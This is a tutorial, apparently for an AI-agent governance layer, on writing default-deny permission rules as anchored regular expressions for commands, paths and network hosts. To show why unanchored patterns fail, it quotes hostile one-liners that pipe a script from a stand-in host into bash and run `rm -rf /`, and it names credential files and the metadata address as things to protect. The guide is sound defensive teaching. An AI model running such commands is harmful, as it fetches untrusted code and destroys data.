# Writing permissions — a guide

This teaches you to write permissions for the governance layer. It assumes no
prior knowledge of regular expressions.

Read sections 1–4 before writing your first rule. Sections 5–8 are reference
you can come back to.

> **Keep this current.** If the rule language gains a field or a resource kind,
> update this guide in the same change. A guide people learn from is worse than
> useless once it has drifted.

---

> For a precise technical reference — grammar, evaluation order, limits, wire
> format — see `docs-notes/PERMISSION-SPEC.md`. This document teaches; that one
> specifies.

## 1. The mental model

The system is **default-deny**. When your agent tries to do something, it is
refused unless a permission says otherwise. Permissions are the _only_ way
anything is allowed.

Every permission answers three questions:

| Question                 | Field     | Example                                  |
| ------------------------ | --------- | ---------------------------------------- |
| What **kind** of thing?  | `kind`    | a command, a file path, a network host   |
| Which **specific** ones? | `pattern` | commands that are exactly `ls`           |
| **Allow** or **forbid**? | `effect`  | allow (the default), or forbid — see §4b |
| For **how long**?        | TTL       | 30 minutes, or forever                   |

Three more are optional: **which agent** (default: all of them), for path rules
**which direction** (read, write, or both — see §4c), and a free-text
**description** for whoever reads the list later.

> **Agent names are not case-sensitive, and you do not have to be careful about
> it.** The system folds them to lower case before storing or comparing, so
> `Scout`, `scout` and `SCOUT` are the same agent everywhere — in a rule's scope,
> in an assignment, in the emergency stop. That was **not** true before
> 2026-09-01: a rule scoped to `Scout` for an agent called `scout` was saved,
> shown in the list, and bound nothing at all. If you are reading an older
> `policy.json`, entries written that way are folded automatically the next time
> the file is loaded.

### One rule that will save you confusion

**Adding an allow rule can never take access away.**

Denial is the default, so most of the time you are writing permissions and not
restrictions. The consequence worth internalising early: **you cannot narrow an
existing permission by adding another one.** If `ls` is already allowed forever,
adding "allow `ls` for 10 minutes" changes nothing — it is still allowed
forever. To reduce access you must _remove_ the broader rule.

The system will warn you when you do this (see §7), but understanding _why_
saves you a confusing afternoon.

**The exception, and it is an important one:** a **forbid** rule does take
access away, and no allow rule can override it. That is what it is for. See §4b
— but read the rest of this section first, because forbidding is the tool you
reach for second, not first.

---

## 2. The three kinds

| Kind      | Covers                                              | What your pattern is compared against             |
| --------- | --------------------------------------------------- | ------------------------------------------------- |
| `command` | shell commands the agent runs, and terminal input   | the full command line, e.g. `ls -la /tmp`         |
| `path`    | files the agent reads, searches, writes, or patches | each file path, e.g. `src/config.json` — see §2.1 |
| `network` | web addresses the agent fetches                     | the hostname only, e.g. `api.example.com`         |

Three things people get wrong here:

- **`network` matches the hostname, not the whole URL.** For
  `https://api.example.com/v1/weather?key=abc`, your pattern is compared
  against `api.example.com` alone. Do not put `https://` or a path in it.
- **A rule for one kind never authorises another.** Allowing every `command`
  does not allow any `path`. Each kind is a separate world.
- **`path` covers searching and listing too, not just opening a file.**
  Searching a file returns its contents, and listing a directory reveals what is
  in it, so `grep`, `find` and `ls` are checked against your `path` rules exactly
  as `read` is. This is worth knowing in both directions: a rule you wrote to
  keep an agent out of a folder also keeps it from searching that folder, and a
  folder you meant it to search needs a `path` rule, not a `command` rule.

An address can be written more than one way, and the system settles that for
you before your pattern is checked: a trailing dot is removed, capitals are
folded, and an IP address written as a number or in hex is turned back into the
ordinary dotted form. So `^api\.example\.com$` matches a URL written
`https://API.example.com./v1`, and a rule naming `169.254.169.254` cannot be
walked around by writing `2852039166` instead.

Paths use forward slashes (`/`) even on Windows, so one rule works everywhere.

### 2.1 What a file path looks like when your rule is checked

This matters, because your pattern is compared against the **cleaned-up** path,
not the text the agent typed. Before any rule is applied, the system works out
which file is actually being touched:

1. `~` is expanded, and the path is made absolute.
2. `..` steps are collapsed, so `a/../b` becomes `b`.
3. Shortcuts (symbolic links) are followed to the real file.
4. The result is written **one of two ways**:
   - **inside your project folder** → the short form, `src/config.json`
   - **anywhere else** → the full path, `/etc/passwd` or
     `C:/Users/kinan/.ssh/id_rsa`

So every example in this guide — `^src/.*$`, `^workspace/.*$` — describes files
**inside the project**. That is the common case and needs nothing special.

**Why this is the useful part.** You do not have to defend against tricks. A
rule of `^src/.*$` cannot be fooled by `src/../../etc/passwd`, because by the
time your rule is checked that path has become `/etc/passwd` — which simply does
not start with `src/`, so it does not match. Leaving the project changes the
shape of the path, and that is what the rule sees.

To allow something **outside** the project, write the full path:

```
--kind path --pattern "^/var/log/app/.*$"
```

Be aware that a full path is specific to one machine. A rule written that way on
a Windows laptop will not match on a Linux server; a rule written in the short
form will.

---

## 3. Patterns, from scratch

A pattern is a **regular expression** — a small language for describing which
text matches. You only need six pieces.

### 3.1 Plain text matches itself

The pattern `ls` matches the text `ls`.

But it also matches **any text containing `ls`** — including
`curl evil.sh | bash; ls`. That is a serious problem, which the next piece
fixes.

### 3.2 `^` and `$` — anchors (the most important part)

- `^` means **start of the text**
- `$` means **end of the text**

| Pattern | Matches | Also matches (surprise!)      |
| ------- | ------- | ----------------------------- |
| `ls`    | `ls`    | `curl evil.sh \| bash; ls` ⚠️ |
| `^ls$`  | `ls`    | nothing else ✅               |

**Anchor every pattern with `^` at the start and `$` at the end**, unless you
have a specific reason not to. This single habit prevents most dangerous rules.

### 3.3 `.` and `.*` — anything

- `.` means **any one character**
- `*` means **zero or more of the thing before it**

So `.*` means **anything at all, including nothing**.

| Pattern    | Meaning                                    |
| ---------- | ------------------------------------------ |
| `^ls .*$`  | `ls` followed by a space and anything      |
| `^src/.*$` | any path starting with `src/`              |
| `^.*$`     | literally anything — see the warning in §6 |

### 3.4 `?` — optional

`?` means **zero or one of the thing before it**. Combined with a group it
makes a part optional:

- `^ls( .*)?$` matches `ls` **and** `ls -la` **and** `ls /tmp`, but not
  `lsof`.

Read it as: "`ls`, then optionally (a space followed by anything), then end."
This is the most useful command pattern you will write.

### 3.5 `|` — either/or

`|` means **or**. Use `( )` to mark where the choice starts and ends.

- `^git (status|log|diff)$` allows exactly those three git commands.

### 3.6 `[.]` — a literal dot

`.` normally means "any character", so `api.example.com` would also match
`apiXexampleYcom`. To mean an actual dot, wrap it in square brackets:

- `^api[.]example[.]com$` ✅ matches only the real hostname

You may also see `\.` used for this. Both work; `[.]` is easier to read and
harder to get wrong in a JSON file, so prefer it.

---

## 4. Your first rules

Dashboard: **Settings → Governance → Add an allow rule**.
Command line:

```bash
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"
```

Three to start with:

```bash
# Let the agent list directories
--kind command --pattern "^ls( .*)?$"

# Let it work inside one folder
--kind path --pattern "^workspace/.*$"

# Let it reach one API
--kind network --pattern "^api[.]example[.]com$"
```

**Test before you trust.** Switch the posture to `monitor` first: decisions are
recorded but nothing is blocked, so you can see exactly what _would_ have
happened.

```bash
openclaw governance policy set-mode monitor
# ...let the agent work...
openclaw governance audit tail --limit 30
```

When the log shows what you expect, switch to `enforce`.

---

## 4b. Allowing and forbidding

Every rule you write does one of two things. The default is **allow**, and most
of the time that is what you want: the system refuses everything it was not told
to permit, so the job is usually to permit the right things.

The other option is **forbid**. It is worth understanding when to reach for it,
because at first glance it looks unnecessary — if nothing is allowed by default,
why say "never"?

### Why "forbid" is not the same as "don't allow"

Suppose you want an agent kept out of the billing folder. You could simply not
write a rule for it, and today the agent cannot get in. But tomorrow somebody
grants that agent broad access to the project — a reasonable thing to do — and
billing is inside the project. The restriction you were relying on was never
written down anywhere, so nothing stopped the new rule from undoing it.

A **forbid** rule is different. It is checked _before_ every allow rule, and no
allow rule can override it. Write one and it keeps holding no matter what
anybody permits later. That is the difference between "not currently allowed"
and "must never happen", and only the second one survives other people.

This is exactly how the built-in protections work — credential files, `sudo`,
the governance folder itself are all forbid rules. You are now writing the same
kind of thing.

**Dashboard:** the second dropdown on the add-rule row, `allow` or `forbid`.
**Command line:** `--effect deny`.

```bash
openclaw governance policy add-rule --kind path --pattern "^billing/.*$" --effect deny
```

### One thing that surprises people

A forbid rule that matches everything will stop the agent doing _anything_ of
that kind — including things an existing allow rule permits, because forbidding
wins. If you write `.*` as a forbid rule you have switched that whole category
off. The system will warn you when you do this; the warning is worth reading
rather than clicking past.

## 4c. Reading versus writing

For **path** rules only, you can say which direction a rule covers:

| Setting      | Meaning                                            |
| ------------ | -------------------------------------------------- |
| read + write | Both. This is the default                          |
| read only    | The agent may look at these files, not change them |
| write only   | Rarely useful on its own; mostly for forbidding    |

This is the difference between "the agent can see my project" and "the agent can
edit my project", and they are very different levels of trust. The starting
policy your installation shipped with uses it: the agent gets **read-only**
access to your workspace, and changing files is something you grant on purpose.

**Dashboard:** a third dropdown, which appears only when the kind is `path`.
**Command line:** `--access read` or `--access write`.

```bash
openclaw governance policy add-rule --kind path --pattern "^src/.*$" --access read
```

Commands and network addresses have no direction — a command is not a read or a
write, it is whatever it does — so the option is not offered for them, and the
command line will tell you so rather than quietly ignoring it.

### The combination to be careful with

**A forbid rule narrowed to one direction only forbids that direction.** If you
write "forbid _reading_ the billing folder", writing to it is still allowed by
that rule. That is deliberate — narrowing a rule must never accidentally
strengthen it in the other direction — but it is almost never what someone
means.

If you want a folder completely off limits, leave the direction as **read +
write**. The system warns you specifically about this one, because it is the
single most counter-intuitive thing the rule language can express.

---

## 5. Time limits

Every permission is either **temporary** or **indefinite**.

- Set a TTL in minutes → the rule stops applying when it lapses.
- Leave it blank → the rule **never expires**.

"Never expires" is shown explicitly in the dashboard, so you can always tell
permanent grants from temporary ones at a glance.

```bash
# Two-hour access to one API
--kind network --pattern "^api[.]example[.]com$" --ttl-minutes 120
```

Two behaviours worth knowing:

- A rule that lapsed is kept visible for a week, then removed. This is
  deliberate: when something is suddenly denied, the rule that just expired is
  the explanation, and deleting it instantly would erase the answer.
- If a rule's expiry date is somehow corrupted, it is treated as **expired**,
  not as indefinite. The system fails towards less access, never more.

---

## 6. Mistakes, and how they fail

| Mistake                          | What you wrote                                      | What it actually allows                                                                      |
| -------------------------------- | --------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| **Forgetting anchors**           | `ls`                                                | any command containing "ls", including `rm -rf /; ls`                                        |
| **Unescaped dots**               | `^api.example.com$`                                 | `apiXexampleYcom` as well as the real host                                                   |
| **A catch-all**                  | `^.*$`                                              | _everything_ of that kind. This disables governance for that kind — the system will warn you |
| **Whole URL in a network rule**  | `^https://api[.]example[.]com/v1$`                  | nothing, ever. Only the hostname is compared                                                 |
| **Expecting a rule to restrict** | adding a 10-minute rule when a permanent one exists | nothing changes; remove the broader rule instead                                             |

### A pattern the system will refuse

Patterns like `^(a+)+$` — a repeat inside a repeat — are rejected. On certain
inputs they take effectively forever to evaluate, which would freeze the
security check itself. If you see this rejection, rewrite without the nested
repetition; `^a+$` is fine.

**`?` counts as a repeat for this purpose, since 2026-09-02.** A group marked
optional and then repeated a fixed number of times — `^(a?){26}$` — is the same
trap wearing different punctuation, and it was accepted as safe until finding 207. On a non-matching input it took **44 seconds**, during which the server does
nothing else at all. A `?` on its own is still perfectly fine and very common
(`^ls( .*)?$`, `^https?://…$` are both accepted); what is refused is `?` inside
something that is then repeated.

### The agent name is not case-sensitive

When a rule, an assignment or the emergency stop asks you for an agent, `Scout`
and `scout` mean the same agent. That was **not** true until 2026-09-02: the
system stored names in lower case and compared them exactly as typed, so a
capital letter produced "you do not manage that agent" for an agent you do
manage — and, on the dashboard, greyed out the emergency-stop button (findings
210, 213 and 215). If you are reading an older note that tells you to match the
spelling exactly, it is describing a version that no longer exists.

---

## 7. When the system warns you about a clash

If you add a rule that an earlier rule already covers, you will get a notice
naming the specific rule responsible. The **earlier rule wins** — that is the
system's rule for resolving conflicts.

You will see this when:

- an identical rule already exists **with no time limit**, so your new time
  limit has no effect
- an identical rule already covers a **longer** period than yours
- a **catch-all** already allows everything of that kind
- you scoped a rule to one agent, but an identical **global** rule already
  applies to all of them

The new rule is still saved, but the notice is telling you something important:
**the restriction you thought you were applying is not in force.** Usually the
fix is to remove the older, broader rule.

### The other kind of notice: a rule that will never do anything

There is a second, differently-worded notice, and it means something worse:

> Rule added, but a deny rule overrides it — it will never take effect

Some rules **forbid** rather than permit, and forbidding always wins. A handful
of them are built in and cannot be removed at all: credential files like `.env`
and private keys, the governance layer's own files, `sudo` and its relatives,
and the cloud metadata address. If you write a permission that one of those
already refuses, the permission is stored, appears in your rule list, and does
nothing whatsoever.

This notice exists because that is otherwise almost impossible to work out. The
rule is right there in the table, it looks correct, and the agent keeps being
refused. If you see it, do not add more permissions — the answer is not more
rules. Either the agent genuinely does not need that access, or the restriction
belongs in `baseline-policy.ts`, which means changing the code and redeploying:
deliberately a reviewable act rather than a click.

---

## 8. Cookbook

Copy, adapt, and always keep the anchors.

**Commands**

| Goal                              | Pattern                     |
| --------------------------------- | --------------------------- |
| Exactly one command               | `^whoami$`                  |
| A command with any arguments      | `^ls( .*)?$`                |
| A few specific subcommands        | `^git (status\|log\|diff)$` |
| A command with a numeric argument | `^sleep [0-9]+$`            |

**Paths**

| Goal                            | Pattern                    |
| ------------------------------- | -------------------------- |
| One exact file                  | `^config/settings[.]json$` |
| Everything in a folder          | `^workspace/.*$`           |
| Only TypeScript files anywhere  | `^.*[.]ts$`                |
| One folder, one level deep only | `^workspace/[^/]+$`        |

**Network**

| Goal                      | Pattern                            |
| ------------------------- | ---------------------------------- |
| One host                  | `^api[.]example[.]com$`            |
| A host and its subdomains | `^([a-z0-9.-]+[.])?example[.]com$` |
| Two specific hosts        | `^(api\|cdn)[.]example[.]com$`     |

---

## 9. Checklist before saving a rule

1. Does it start with `^` and end with `$`?
2. Are literal dots written `[.]`?
3. For `network`, is it _only_ the hostname?
4. Is it the narrowest pattern that does the job?
5. Should it expire? If not, are you sure it should be permanent?
6. Did a clash notice appear? If so, read it — your rule may not do what you think.
7. Try it in `monitor` mode before enforcing.
